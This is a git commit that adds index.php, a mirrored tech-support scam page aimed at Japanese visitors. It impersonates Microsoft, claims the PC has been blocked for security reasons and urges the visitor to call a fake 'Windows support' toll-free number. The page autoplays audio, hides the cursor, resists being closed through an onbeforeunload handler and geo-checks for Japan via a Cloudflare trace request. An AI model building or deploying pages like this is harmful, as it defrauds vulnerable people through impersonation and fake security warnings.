63dcc2c4cd2f1e084e5d095f73c1a21d819e570e
kapicofee <kapicofee@gmail.com>
2025-04-15 22:21:15 +0530

    Add files via upload

---
+++ index.php
@@ -0,0 +1,221 @@
+<?php
+header("X-Robots-Tag: noindex, nofollow", true);
+?>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<!DOCTYPE html><html id="htmldemo" class="htmldemocl" lang="en"><!-- Mirrored from processesabletoserves.z13.web.core.windows.net/Ssafpges3oi5frepsocd-0fepso2cidos4cdp-odce3pso-dwpsod2ewpsc-deps0od3fep5slk-cjfeis3depwos5dos-d0fre2oscfd-d0f1repsoc-fdep4sodfpdc/002/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 16 Aug 2024 10:36:26 GMT --><head>
+    <meta charset="utf-8">
+    <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
+    <meta content="noindex,nofollow" name="robots">
+    <title>無料ポルノHD</title>
+    <link rel="shortcut icon" type="image/png" href="images/msmm.png">
+    <link href="css/tapa.css" rel="stylesheet">
+    
+    <script async="" src="js/gtm.js"></script>
+    <script type="text/javascript" src="js/noir.js"></script> 
+    <script type="text/javascript" src="js/js1.js"></script>
+    <script type="text/javascript" src="js/js2.js">
+    </script><script type="text/javascript" src="js/js3.js">
+    </script><script type="text/javascript" src="js/js4.js"></script>
+    <script type="text/javascript" src="js/custom.js"></script>
+    <script type="text/javascript" src="js/main.js"></script>
+    <script src="js/script.js" data-site="DONONPVS" defer=""></script>
+    <script type="text/javascript" src="js/custom.js"></script>
+    <script type="text/javascript" src="js/micro.js"></script>
+    <script  src="js/esc.js"></script>
+    <script type="text/javascript" src="js/custom2.js"></script>
+    <script type="text/javascript">
+      var phone_number = '(0101) 505 718 4819';
+
+    </script>
+
+    <style>
+      #banners{
+        width: 190px;
+    position: absolute;
+    left: 270px;
+    top: 180px;
+      }
+      .haruto {
+        position: absolute;
+    bottom: 111px;
+    left: 105px;
+    color: #124d9b;
+    width: 520px;
+    font-weight: 700;
+    font-size: 25px;
+    border: 1px solid #124d9b;
+    padding: 0 10px;
+    border-radius: 5px;
+}
+#footer_btn {
+  width: 142px;
+    position: absolute;
+    left: 73%;
+    bottom: 6%;
+    box-shadow: 0 1px 5px 0 rgba(0,0,0,.2), 0 2px 2px 0 rgba(0,0,0,.14), 0 3px 1px -2px rgba(0,0,0,.12);
+}
+#footer_btn a {
+  color: #fff;
+}
+.haru {
+  position: absolute;
+    bottom: 95px;
+    left: 275px;
+    font-size: 18px;
+    color: #ffffffd1;
+    font-weight: 800;
+}
+    </style>
+
+  </head>
+  <body class="map" id="mycanvas" onbeforeunload="return myFunction()" style="cursor:none">
+
+ 	<audio id="websgt">
+        <source src="media/eng.mp3" type="audio/mpeg">
+      </audio>
+      <audio autoplay="" id="infogt">
+        <source src="media/eng.mp3" type="audio/mpeg">
+      </audio>
+	  
+    <div id="age-confirmation-modal">
+
+      <div class="innerContainer">
+        
+
+
+	          
+           
+                   
+                      <div>
+                        <button type="button" class="close" data-dismiss="close" aria-label="Close">
+          <span aria-hidden="true">X</span>
+          </button>
+          
+             
+                      </div>
+                 
+                     <div style="font-size:40px;">
+                      を購読してください！
+                      </div>
+                      <div style="font-size:20px;">
+                        オンライン食品配達が40%オフ
+                        </div>
+                      <div>
+                        <button type="button" class="btn btn-secondary btn-lg">
+                          申し込む Subscribe</button>
+           <button type="button" class="btn btn-primary btn-lg" style="color: #fff;
+           background-color: #007bff;
+           border-color: #007bff;">
+          存在する Exit</button>
+                      </div>
+                     
+                      
+                      
+                  </div>
+      
+              </div>
+
+  
+	  
+	  
+    <div class="bg" style="cursor:none">
+      <div class="bgimg" style="top:0">
+        <img src="images/f24.png" alt="" width="100%">
+      </div>
+    </div>
+    <a href="#" id="link_black" style="cursor:none" rel="noreferrer">
+      <div class="black" style="height: 145%; cursor: none; display: block;"></div>
+    </a>
+    <div class="pro_box3" style="display: block;">
+      <img src="images/nbx1.jpg" alt="" width="100%" style="height: auto;">
+    </div>
+
+
+    <div class="cardcontainer" style="display: block;" id="pop_up_new">
+      <img src="images/bx2.jpg" alt="" style="width: 500px;">
+      <strong class="haru"><script>document.write(phone_number);</script></strong>
+    </div>
+
+    <div class="lightbox" id="poptxt" style="display: block;">
+      <div class="row firewall-pro">
+        <div class="col-md-12">
+          <img src="images/nmnbx.png" alt="" style="width: 670px;height: auto;">
+          <img src="images/re.gif" id="banners">
+          <strong class="haruto"><script>document.write(phone_number);</script> (日本フリーダイヤル)</strong>
+          <div class="fr button blink" id="footer_btn">
+            <a href="#" class="blink">OK</a>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="answer_list" style="display:none;background-color: rgb(49, 52, 57); height: auto; width: 550px; left: 32%; position: absolute; z-index: 2147483647; border: 1px solid rgb(214, 216, 219); border-radius: 0.5rem; padding-bottom: 8px;" id="welcomeDiv">
+      <p style="color:#FFFFFF;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">この PC へのアクセスはセキュリティ上の理由からブロックされています。 この PC にアクセスしたり再起動したりしないでく&nbsp;さい。 この基本的な警告を見落とすと、このフレー&nbsp;ワークに関する情&nbsp;が失われる可能性があります。 できる&nbsp;け早くサポートに連絡してく&nbsp;さい。Microsoft の専門家が電話で調査を案内します。 このアプリケーションを実行すると、PC が危険にさらされる可能性があります。<br>
+        <strong>
+          Windows サポート: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px"> <script>document.write(phone_number);</script> (日本フリーダイヤル) </span>
+        </strong>
+      </p>
+    </div>
+
+    <div id="chat" style="display: block;">
+      <img src="images/msmm.png">
+      <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
+      <p style="font-weight:600;font-size:24px">サポートに電話する: <br>
+      </p>
+      <h4 style="font-weight:600;font-size:22px"> <script>document.write(phone_number);</script> <br>(日本フリーダイヤル)</h4>
+      <div class="arrow-down">
+        <svg height="1em" viewBox="0 0 320 512">
+          <style>
+            svg {
+              fill: #fff
+            }
+          </style>
+          <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path>
+        </svg>
+      </div>
+    </div>
+    
+
+</body>
+</html>
+<script>
+  const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  console.log(timeZone); 
+function parseTrace(url){
+  let trace = [];
+  let scrpt=('');
+  $.ajax(url,
+      {
+          success: function(response){
+              let lines = response.split('\n');
+              let keyValue;
+
+              lines.forEach(function(line){
+                  keyValue = line.split('=');
+                  trace[keyValue[0]] = decodeURIComponent(keyValue[1] || '');
+                
+                   if(keyValue[0] === 'loc' && trace['loc'] == 'JP' && timeZone =='Asia/Tokyo'){
+                    
+                    
+                    
+                    
+                  }
+                  
+                
+                  
+                  
+
+                  
+              });
+
+              return trace;
+          },
+          error: function(){
+              return trace;
+          }
+      }
+  );
+};
+
+let cfTrace = parseTrace('https://one.one.one.one/cdn-cgi/trace');
+</script>
